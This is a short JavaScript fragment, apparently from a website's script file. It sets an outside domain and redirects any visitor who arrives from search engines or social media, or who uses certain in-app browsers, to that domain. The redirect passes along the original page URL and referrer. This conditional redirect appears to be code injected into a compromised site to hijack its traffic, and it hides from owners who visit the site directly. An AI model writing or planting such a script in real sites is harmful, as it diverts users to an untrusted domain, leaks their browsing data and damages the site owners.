...
///// Arsae /////
var ars = 'https://us.teknodrem.com';
//if(['.google.', 'google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) } 

if(['.google.', 'google.', 'bing.', '.bing.', 'yandex.', '.facebook.', 'facebook.', 'pinterest.', '.pinterest', 'duckduckgo.', '.yahoo.', 't.co', 'instagram.', '.instagram.', '.ecosia.', '.aol.', '.qwant.', '.tripadvisor.', 'alohafind.', '.youtube.', '.seznam.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
